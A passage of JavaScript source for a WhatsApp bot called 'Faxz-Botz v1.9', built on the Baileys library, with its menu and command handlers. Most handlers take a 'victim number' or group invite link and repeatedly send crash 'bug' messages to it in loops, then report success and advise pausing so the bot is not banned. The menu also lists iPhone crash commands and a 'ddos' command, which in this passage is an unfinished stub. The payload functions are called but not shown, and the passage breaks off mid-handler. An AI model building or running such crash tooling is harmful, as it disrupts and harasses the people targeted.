const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/1d05143d785a098208622.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
anggazyy.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
anggazyy.groupParticipantsUpdate(m.chat, [sender], 'delete')
anggazyy.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'menu': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `
*Hay @${sender.split("@")[0]} Kamu Memanggil Faxz-Botz v1.9*

╭━━━┳━━━┳━╮╭━┳━━━━╮
┃╭━━┫╭━╮┣╮╰╯╭┻━━╮━┃
┃╰━━┫┃╱┃┃╰╮╭╯╱╱╭╯╭╯
┃╭━━┫╰━╯┃╭╯╰╮╱╭╯╭╯╱
┃┃╱╱┃╭━╮┣╯╭╮╰┳╯━╰━╮
╰╯╱╱╰╯╱╰┻━╯╰━┻━━━━╯

          *INFORMASI BOTz*
  ★   Name : *${pushname}*
  ★   Number: *${m.sender.split('@')[0]}*
  ★   Status: *${isPremium ? "Premium" : "Free"}*
  ★   Libary: *Team ཀ͜͡⃟ཀ͜͡⃟𝘍𝖆𝘹҉𝘻̼͙̓́ͭ ⃰͜͡؜𝐕⃟᜴ᴇ𝐳ᥣׁ𝘤̸̛͂̐̓͗𝚛𝖆𝚜𝚑> ཀ͜͡⃟╮*
  ★   Runtime : *${run}*
  ★   CREATOR : *ཀ͜͡⃟ཀ͜͡⃟𝘍𝖆𝘹҉𝘻̼͙̓́ͭ ⃰͜͡؜-Botz> ཀ͜͡⃟╮*

*》》》》》FAXZ-BOTz v1.9《《《《《*
> *_BUG V1_*

> ཀ͜͡⃟╮  ${prefix}*onekil 62xxx*
> ཀ͜͡⃟╮  ${prefix}*faxzcrash 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*doublekil 62xxxz*
> ཀ͜͡⃟╮  ${prefix}*triplekill 62xxxx*
> ཀ͜͡⃟╮  ${prefix}*notif-ui 62xxx*
> ཀ͜͡⃟╮  ${prefix}*notif-crash 62xxx*
> ཀ͜͡⃟╮  ${prefix}*crash-total 62xxx*
> ཀ͜͡⃟╮  ${prefix}*xcrashry 62xxx*
> ཀ͜͡⃟╮  ${prefix}*unlimited-bug 62xxx*
> ཀ͜͡⃟╮  ${prefix}*chace-bug 62xxx*
> ཀ͜͡⃟╮  ${prefix}*phone-crash 62xxx*
> ཀ͜͡⃟╮  ${prefix}*realyreact <reply message>*

*》》》》》FAXZ-BOTz v1.9《《《《《*
> *_BUG V2_*

> ཀ͜͡⃟╮  ${prefix}*internal-crash 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*internal-ui 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*crash-myinter 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*realy-inter 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*realy-exter 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*engine-crash 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*engine-internal 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*engine-external 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*engine-ui 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*bug-engine 62xxx, jumlah*
> ཀ͜͡⃟╮  ${prefix}*bug-quoted 62xxx*
> ཀ͜͡⃟╮  ${prefix}*internal-quoted 62xxx*
> ཀ͜͡⃟╮  ${prefix}*external-quoted 62xxx*

*》》》》》FAXZ-BOTz v1.9《《《《《*
> *_BUG GROUP_*

> ཀ͜͡⃟╮  ${prefix}*bug-button link group*
> ཀ͜͡⃟╮  ${prefix}*buggcry link group*
> ཀ͜͡⃟╮  ${prefix}*button-internal link group*
> ཀ͜͡⃟╮  ${prefix}*button-external link group*
> ཀ͜͡⃟╮  ${prefix}*ui-grup link group*
> ཀ͜͡⃟╮  ${prefix}*bug-hole 120###@g.us*
> ཀ͜͡⃟╮  ${prefix}*enemygroup 120###@g.us*
> ཀ͜͡⃟╮  ${prefix}*internal-group 120###@g.us*
> ཀ͜͡⃟╮  ${prefix}*external-group 120###@g.us*

*》》》》》FAXZ-BOTz v1.9《《《《《*
> *_BUG EMOJI_*

> ཀ͜͡⃟╮  ${prefix}*🔥 62xxx*
> ཀ͜͡⃟╮  ${prefix}*🌷 62xxx*
> ཀ͜͡⃟╮  ${prefix}*💥 62xxx*
> ཀ͜͡⃟╮  ${prefix}*🌹 62xxx*
> ཀ͜͡⃟╮  ${prefix}*⭐ 62xxx*
> ཀ͜͡⃟╮  ${prefix}*⚡ 62xxx*
> ཀ͜͡⃟╮  ${prefix}*😈 62xxx*
> ཀ͜͡⃟╮  ${prefix}*💀 62xxx*

*》》》》》FAXZ-BOTz v1.9《《《《《*
> *_BUG IPHONE_*

> ཀ͜͡⃟╮  ${prefix}*ios-ui 62xxx*
> ཀ͜͡⃟╮  ${prefix}*ios-unlimited 62xxx*
> ཀ͜͡⃟╮  ${prefix}*ios-infinity 62xxx|timer*
> ཀ͜͡⃟╮  ${prefix}*ios-uicrash 62xxx|timer*

*》》》》》FAXZ-BOTz v1.9《《《《《*
> *_SETTING OWNER_*

> ཀ͜͡⃟╮  ${prefix}*pemilik*
> ཀ͜͡⃟╮  ${prefix}*diam*
> ཀ͜͡⃟╮  ${prefix}*public*
> ཀ͜͡⃟╮  ${prefix}*addprem 62xx*
> ཀ͜͡⃟╮  ${prefix}*delprem 62xx*

*》》》》》FAXZ-BOTz v1.9《《《《《*
> *_MAIN MENU_*

> ཀ͜͡⃟╮  ${prefix}*tiktok <link>*
> ཀ͜͡⃟╮  ${prefix}*ddos <ip addres user>*

> ཀ͜͡⃟ཀ͜͡⃟𝘍𝖆𝘹҉𝘻̼͙̓́ͭ ⃰͜͡؜-Botz> ཀ͜͡⃟╮ v1.9
> POWERED : ཀ͜͡⃟ཀ͜͡⃟𝘍𝖆𝘹҉𝘻̼͙̓́ͭ ⃰͜͡؜-Botz> ཀ͜͡⃟╮
`
           anggazyy.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
     await anggazyy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break
             
            
case 'database':
if (!isOwner) return reply(mess.only.owner)
reply('Fitur ini dalam tahap pengembangan harap tunggu!')
break             
case 'ddos':
if (!isOwner) return reply(mess.only.owner)
reply('Fitur ini dalam tahap pengembangan harap tunggu!')
break
case 'cleardb':
if (!isOwner) return reply(mess.only.owner)
reply('Fitur ini dalam tahap pengembangan harap tunggu!')
break
case 'cekip':
if (!isOwner) return reply(mess.only.owner)
reply('Fitur ini dalam tahap pengembangan harap tunggu!')
break
case 'blacklist':
if (!isOwner) return reply(mess.only.owner)
reply('Fitur ini dalam tahap pengembangan harap tunggu!')
break
case 'unblacklist':
if (!isOwner) return reply(mess.only.owner)
reply('Fitur ini dalam tahap pengembangan harap tunggu!')
break
case 'loginweb':
if (!isOwner) return reply(mess.only.owner)
reply('Fitur ini dalam tahap pengembangan harap tunggu!')
break
case 'logout':
if (!isOwner) return reply(mess.only.owner)
reply('Fitur ini dalam tahap pengembangan harap tunggu!')
break
case "pemilik": {
const repf = await anggazyy.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
anggazyy.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Kuh`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await anggazyy.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "jids-unexpected": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-lol": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-system": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-toui": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-external": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-internal": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-engine": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "faxzcrash": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "realy-exter": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "realy-inter": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "internal-crash": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "crash-myinter": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "ui-grup":
  {
    if (!isPremium) return reply(mess.prem)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await anggazyy.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
      anggazyy.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break;
case "internal-ui": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await anggazyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
//=================================================//
case 'xcrashry': case '🌹': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'notif-ui': case 'notif-crash': case 'crash-total': case '🔥': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'chace-bug': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
